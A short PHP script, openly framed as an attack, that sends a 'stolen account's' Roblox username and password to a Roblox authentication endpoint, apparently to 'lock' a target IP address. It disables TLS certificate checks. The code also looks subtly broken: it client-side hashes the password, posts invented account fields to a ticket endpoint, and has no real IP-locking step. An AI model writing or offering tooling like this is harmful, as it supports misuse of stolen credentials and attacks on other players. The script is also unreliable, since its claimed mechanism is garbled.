<?php

// Set the Roblox API endpoint
$api_endpoint = 'https://auth.roblox.com/v1/usertickets/create';

// Set the stolen account's username
$username = 'stolenaccount';

// Set the target IP address to lock
$target_ip = '248.119.91.22';

// Set the stolen account's password (optional)
$password = 'sabskasabias123';

// Generate a random salt for the password
$salt = random_bytes(16);

// Hash the password with the salt
$hashed_password = password_hash($password . bin2hex($salt), PASSWORD_BCRYPT);

// Set the stolen account's data
$data = array(
    'Username' => $username,
    'Password' => $hashed_password,
    'Salt' => bin2hex($salt),
    'PurchaseCountry' => 'US',
    'LastLogin' => time(),
    'MachineHash' => hash('sha256', $target_ip . $hashed_password),
    'Created' => time(),
    'Ratings' => 0,
    'RoleId' => 0
);

// Set the Roblox API headers
$headers = array(
    'Content-Type: application/json',
    'User-Agent: Roblox/WinInet'
);

// Encode the stolen account's data as JSON
$json_data = json_encode($data);

// Initialize cURL
$ch = curl_init();

// Set the cURL options
curl_setopt($ch, CURLOPT_URL, $api_endpoint);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);

// Execute the cURL request
$response = curl_exec($ch);

// Close the cURL session
curl_close($ch);

// Print the response
print_r($response);

?>